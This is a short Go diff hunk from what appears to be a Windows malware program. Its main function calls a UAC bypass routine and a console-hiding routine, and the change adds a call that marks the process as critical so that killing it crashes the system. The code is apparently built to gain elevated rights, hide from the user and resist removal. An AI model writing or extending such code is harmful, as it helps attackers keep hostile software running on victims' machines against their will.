@@ -42,7 +42,7 @@ func main() {
 	if program.IsAlreadyRunning() {
 		return
 	}
-
+        program.SetProcessCritical()
 	uacbypass.Run()
 
 	hideconsole.Run()
